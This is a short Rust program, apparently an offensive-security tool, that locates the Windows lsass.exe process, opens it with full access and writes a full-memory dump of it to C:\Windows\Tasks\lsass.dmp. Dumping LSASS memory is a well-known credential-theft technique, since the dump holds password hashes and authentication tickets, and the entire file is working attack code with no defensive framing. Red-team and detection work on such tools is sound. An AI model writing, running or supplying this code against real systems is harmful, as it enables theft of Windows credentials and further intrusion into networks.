use std::{ffi::CString, process::exit};
use sysinfo::{PidExt, ProcessExt, System, SystemExt};
use windows::core::PCSTR;
use windows::Win32::Foundation::{CloseHandle, HANDLE};
use windows::Win32::Storage::FileSystem::{
    CreateFileA, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, FILE_GENERIC_WRITE, FILE_SHARE_READ,
    FILE_SHARE_WRITE,
};
use windows::Win32::System::Diagnostics::Debug::{MiniDumpWithFullMemory, MiniDumpWriteDump};
use windows::Win32::System::Threading::{OpenProcess, PROCESS_ALL_ACCESS};

fn find_lsass() -> Result<u32, String> {
    let mut system = System::new_all();
    system.refresh_all();

    let lsass_pid = system
        .processes()
        .values()
        .find(|process| process.name().to_lowercase() == "lsass.exe")
        .map(|process| process.pid().as_u32());

    lsass_pid.ok_or_else(|| String::from("Error finding lsass PID!"))
}

fn main() {
    let pid_lsass = find_lsass().unwrap_or_else(|e| {
        eprintln!("[!] find_lsass Failed With Error: {}", e);
        exit(-1);
    });

    let hprocess = unsafe {
        OpenProcess(PROCESS_ALL_ACCESS, false, pid_lsass).unwrap_or_else(|e| {
            eprintln!("[!] OpenProcess Failed With Error: {}", e);
            exit(-1);
        })
    };

    let path = CString::new("C:\\Windows\\Tasks\\lsass.dmp").expect("CString::new failed");

    let hfile = unsafe {
        CreateFileA(
            PCSTR(path.as_ptr() as *const u8),
            FILE_GENERIC_WRITE.0,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            None,
            CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            HANDLE(0),
        )
        .unwrap_or_else(|e| {
            eprintln!("[!] CreateFileA Failed With Error: {}", e);
            exit(-1);
        })
    };

    println!("[+] HANDLE lsass.exe: {:?}", hprocess);
    println!("[+] PID: {:?}", pid_lsass);

    unsafe {
        MiniDumpWriteDump(
            hprocess,
            pid_lsass,
            hfile,
            MiniDumpWithFullMemory,
            None,
            None,
            None,
        )
        .unwrap_or_else(|e| {
            eprintln!("[!] MiniDumpWriteDump Failed With Error: {}", e);
            exit(-1);
        });

        println!("[+] lsass dump successful!");

        CloseHandle(hprocess);
        CloseHandle(hfile);
    }
}